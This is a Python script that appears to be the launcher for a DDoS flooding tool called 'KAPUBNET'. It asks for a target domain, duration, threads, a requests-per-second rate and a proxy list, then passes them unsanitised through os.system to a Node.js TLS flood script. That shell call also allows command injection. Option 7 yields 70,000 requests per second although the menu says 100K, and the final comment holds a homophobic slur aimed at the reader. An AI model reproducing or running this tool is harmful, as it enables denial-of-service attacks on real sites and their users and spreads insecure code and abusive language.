import os

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def bannerprint():
    print(f"\033[91m██╗  ██╗ █████╗ ██████╗ ██╗   ██╗██████╗ ███╗   ██╗███████╗████████╗")
    print(f"\033[31m██║ ██╔╝██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝╚══██╔══╝")
    print(f"\033[31m█████╔╝ ███████║██████╔╝██║   ██║██████╔╝██╔██╗ ██║█████╗     ██║")
    print(f"\033[31;2m██╔═██╗ ██╔══██║██╔═══╝ ██║   ██║██╔══██╗██║╚██╗██║██╔══╝     ██║   ")
    print(f"\033[31;2m██║  ██╗██║  ██║██║     ╚██████╔╝██████╔╝██║ ╚████║███████╗   ██║   ")
    print(f"\033[31;2m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝\033[0m")
    print(f"\033[95m Coded by Kapub.")
    
def getrequestcount():
    print("\033[96m[?] Choose the requests that are going to be sent per second! (Don't choose too high else it might be less effective)")
    print("\033[91m[1] 10K requests per sec\n[2] 20K requests per sec\n[3] 30K requests per sec\n[4] 40K requests per sec\n[5] 50K requests per sec\n[6] 60K requests per sec\033[94m (might be unstable due to high request frequency)\n\033[91m[7] 100K requests per sec\033[94m (might be unstable due to high request frequency)")

    valid_choices = ['1', '2', '3', '4', '5', '6', '7']

    choice = input(f"\033[38;5;208m>> ")

    while choice not in valid_choices:
        print("\033[91mInvalid choice. Please choose a number from 1 to 7.")
        choice = input(f"\033[38;5;208m>> ")

    request = int(choice) * 10000

    return request

def getoptions():
    target = input(f"\033[96m[?] Target Domain:\n\033[38;5;208m>> \033[0m")
    time = input(f"\033[96m[?] Time (in seconds):\n\033[38;5;208m>> \033[0m")
    thread = input(f"\033[96m[?] Thread count:\n\033[38;5;208m>> \033[0m")
    request = getrequestcount()
    proxy = input(f"\033[96m[?] Proxy (be sure proxy is in same folder/dir as the tool and is a txt file.):\n\033[38;5;208m>> \033[0m")
    return target, time, request, thread, proxy

def run(target, time, request, thread, proxy):
    os.system(f'node KAPUBNET-TLS.js {target} {time} {request} {thread} {proxy}')

def main():
    clear()
    bannerprint()
    target, time, request, thread, proxy = getoptions()
    run(target, time, request, thread, proxy)

main()

# if ur reading this ur gay as fuck. get out of here perv. - SqLoSt